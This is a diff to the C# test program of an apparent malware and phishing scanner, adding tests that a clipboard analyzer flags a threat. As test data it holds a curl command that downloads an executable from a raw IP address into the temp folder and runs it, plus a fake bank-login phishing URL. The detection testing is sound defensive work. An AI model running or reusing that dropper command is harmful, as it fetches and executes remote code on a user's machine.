@@ -150,6 +150,18 @@ internal static class Program
 
                 var safe = analyzer.Analyze("https://www.microsoft.com/en-us");
                 Assert(safe.IsSafe, $"Safe official URL marked unsafe: {string.Join(", ", safe.Reasons)}");
+
+                string curlCmd = "curl -fLsS \"http://176.111.220.220/Winrar64bit.exe\" -o \"%TEMP%\\Winrar64bit\" && start \"\" \"%TEMP%\\Winrar64bit.exe\"";
+                var clipCurl = analyzer.AnalyzeClipboardContent(curlCmd);
+                Assert(clipCurl.HasThreat && clipCurl.FlaggedUrls.Count == 1 && clipCurl.MaxRiskScore >= 85,
+                    $"Curl dropper clipboard snippet missed (HasThreat={clipCurl.HasThreat}, Score={clipCurl.MaxRiskScore})");
+
+                string multilineMsg = "Check this link out:\nhttps://vietcombank-xacthuc-24h.top/login\nthanks!";
+                var clipMulti = analyzer.AnalyzeClipboardContent(multilineMsg);
+                Assert(clipMulti.HasThreat && clipMulti.FlaggedUrls.Count == 1, "Multi-line clipboard phishing URL missed");
+
+                var clipSafe = analyzer.AnalyzeClipboardContent("Hello world, visit https://www.microsoft.com/en-us for docs.");
+                Assert(!clipSafe.HasThreat, "Benign clipboard text falsely flagged");
             });
 
             RunTest("QuarantineService: AES-256-GCM Encrypt, Delete Original, Restore & Shred", () =>
